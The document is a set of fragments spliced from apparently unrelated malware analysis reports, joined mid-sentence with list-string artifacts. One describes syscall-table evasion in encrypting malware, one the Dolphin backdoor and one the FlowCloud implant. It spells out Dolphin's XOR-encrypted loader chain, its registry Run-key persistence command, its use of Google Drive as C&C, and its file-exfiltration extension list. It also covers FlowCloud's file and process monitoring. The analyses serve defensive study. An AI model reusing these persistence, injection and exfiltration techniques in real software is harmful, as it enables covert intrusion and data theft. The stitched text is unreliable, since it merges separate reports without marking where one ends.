then stores the numbers in a table for future use.When needed, it calls a stub routine that uses the number directly with the syscall instruction instead of using the NT API.In other words, the malware first creates a syscall table for NT APIs used for file encryption:Figure 3  Creation of syscall table for certain NT APIs.The end of the table is a section with the relevant syscall numbers:Figure 4  Section containing the syscall table.The example below shows how the syscall numbers are used:Figure 5  Example use of direct syscall.This obfuscated process is not required for the

(embedded in the installer) containing the rest of the loading chain, including the payload, is encrypted with a one-byte XOR key derived from the current time and written to<loader_encrypted_step_2>.In order to persist the start of the loading chain, the installer sets a Run registry value:HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\<random_run_name>\\\\""%appdata%\\\\Python27({32|64})\\\\pythonw.exe"" ""<loader_step_1>"" ""<loader_encrypted_step_2>""The<random_run_name>is randomly selected from existing filenames matching%WINDIR%\\\\inf\\\\*.inf, discarding the.infextension.To start the loading chain after installation, it creates a one-time scheduled task.Dolphin loaderThe Dolphin loader consists of a Python script and shellcode.Step 1, the Python script, reads a specified file, XOR-decrypts its contents, and executes the resulting shellcode.Step 2, shellcode, creates a host process (random CLI executable from%WINDIR%\\\\System32\\\\*.exe), XOR-decrypts further shellcode carried within itself, and injects it into the created process.Step 3, another shellcode, XOR-decrypts an embedded PE file  the Dolphin backdoor  and loads and executes it using a custom PE loader.Dolphin backdoorDolphin is a backdoor that collects information and executes commands issued by its operators.', 'The backdoor is a regular Windows executable, written in C++.', 'It communicates with Google Drive cloud storage, which is used as its C&C server.We named the backdoor Dolphin based on a PDB path found in the executable:D:\\\\Development\\\\BACKDOOR\\\\Dolphin\\\\x64\\\\Release\\\\Dolphin.pdbPersistenceThe backdoor periodically checks and creates its own persistence by making sure that Step 1 of the loader is run every time the system is started, via a registry Run value, in the same way as in the installer:HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\<random_run_name>\\\\""%appdata%\\\\Python27({32|64})\\\\pythonw.exe"" ""<loader_step_1>"" ""<loader_encrypted_step_2>""CapabilitiesThe following basic information about the computer and the backdoor is collected:Current backdoor configurationUsernameComputer nameLocal and external IP addressList of installed security productsRAM size and usageResult of check for debugger and other inspection tools (such as Wireshark)OS versionCurrent timeMalware versionDolphin downloads commands, issued by its operators, from Google Drive storage and executes them.', 'After execution, the output of commands is uploaded.', 'Most of Dolphins capabilities are controlled through commands.The most relevant capabilities are described below.File exfiltrationBy default, Dolphin searches all non-fixed drives (USBs), creates directory listings and exfiltrates files by extension.', 'This search can be extended to fixed drives (HDDs), via dedicated commands.The following file extensions of interest, specific to media, documents, emails, and certificates, are specified in the default configuration:jpg, doc, xls, ppt, hwp, url, csv, pdf, show, cell, eml, odt, rtf, nxl, amr, 3gp, m4a, txt, msg, key, der, cer, docx, xlsx, pptx, pfx, mp3Besides this automatic search, specific files can be exfiltrated.In the newer versions, the default search was extended to fixed drives.', 'The command to get specific files was improved, by caching/storing it in the configuration until completion.Portable devicesAmong regular drives, Dolphin also searches portable devices such as smartphones, using the Windows Portable Device (WPD) API.', 'It creates directory listings and exfiltrates files.', 'This functionality appeared to be under development in the first version we found, for several reasons:Relying on a hardcoded path with a username that likely doesnt exist on the victims computerMissing variable initialization  some variables are assumed to be zero-initialized, or dereferenced as pointers without initializationMissing extension filteringThe code is heavily based on Microsofts Portable Devices COM APIcode sample.Apart from automatic search, the operators can specify individual files to be exfiltrated from portable devices.In newer versions, this capability was finished and improved by adding extension filtering.']"

implant uses a lot of classes.', 'Rather than documenting each of them individually, we will present an overview of the available functionality by grouping them into three categories: those that interact with the file system, functionalities that collect information about programs and processes, and those that gather real-time information about user activity.File systemFlowCloud provides interaction with the file system in a variety of ways, most of which can store file metadata and content in their SQLite database.One of these is a component that walks through all mapped file systems and collects files that are not excluded by filters in thesmfile_search_policy.', 'It also creates an invisible window that listens for file creation, modification, or renaming events.', 'The corresponding files are collected unless they are excluded by that policy.Another component collects information about mapped volumes, including mount point, name, drive type, and disk usage data.', 'This same class collects file and directory metadata.As a complement to these automated measures, the backdoor implements functions that provide full access and control over the content of mounted drives.', 'This includes bidirectional file transfers between the C&C and the compromised machine.Programs and processesFlowCloud is able to automatically obtain a list of installed software through the use of the undocumentedIShellAppManagerCOM interface.', 'This functionality can also be invoked via a C&C command.', 'Figure 14 shows, after the extraneous code has been removed, how that interface is used.Figure 14.', 'Simplified code showing how theIShellAppManagerCOM interface is used to list installed applicationsOther commands can be used to retrieve a detailed list of available services and currently running processes.Another interesting feature is the near real-time monitoring of process activity.']"
